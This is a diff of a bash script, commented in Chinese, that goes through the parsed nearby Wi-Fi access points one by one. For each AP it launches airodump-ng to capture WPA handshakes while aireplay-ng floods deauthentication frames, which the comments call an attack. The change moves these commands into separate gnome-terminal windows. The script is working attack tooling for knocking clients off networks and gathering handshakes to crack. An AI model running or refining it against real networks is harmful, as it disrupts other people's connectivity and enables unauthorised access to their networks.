@@ -13,23 +13,23 @@ fi
 # 從解析文件中逐一處理每個 AP
 while IFS=, read -r line
 do
-    BSSID=$(echo $line | awk '{print $2}')
-    CHANNEL=$(echo $line | awk '{print $4}')
+    BSSID=$(echo $line | awk -F', ' '{print $1}' | cut -d' ' -f2)
+    CHANNEL=$(echo $line | awk -F', ' '{print $2}' | cut -d' ' -f2)
     ESSID=$(echo $line | awk -F', ESSID:' '{print $2}')
 
     if [ "$CHANNEL" -gt 0 ]; then
-        echo "正在處理 AP，ESSID: $ESSID (BSSID: $BSSID, 頻道: $CHANNEL)..."
+        echo "正在處理 AP，BSSID: $BSSID, 頻道: $CHANNEL, ESSID: $ESSID"
         
-        # 使用 airodump-ng 進行捕捉
-        sudo timeout 10 airodump-ng --bssid $BSSID -c $CHANNEL -w "$HANDSHAKE_DIR/$ESSID" $INTERFACE &
+        # 使用 gnome-terminal 進行 airodump-ng 捕捉，終端執行完自動關閉
+        gnome-terminal -- bash -c "sudo timeout 10 airodump-ng --bssid $BSSID -c $CHANNEL -w '$HANDSHAKE_DIR/$ESSID' $INTERFACE"
         
-        # 並行執行 deauthentication 攻擊
-        sudo timeout 10 aireplay-ng --deauth 10 -a $BSSID $INTERFACE &
+        # 並行執行 deauthentication 攻擊，進行 10 次 deauth 攻擊，終端執行完自動關閉
+        gnome-terminal -- bash -c "sudo aireplay-ng --deauth 10 -a $BSSID $INTERFACE"
         
-        # 等待進程完成
-        wait
-        
-        # 檢查是否成功捕捉到握手包
+        # 延遲 5 秒等待處理下一個 AP
+        sleep 5
+
+        # 檢查是否成功擷取到握手包
         if ls "$HANDSHAKE_DIR/$ESSID"-*.cap 1> /dev/null 2>&1; then
             echo "成功擷取握手包：$HANDSHAKE_DIR/$ESSID-01.cap"
         else
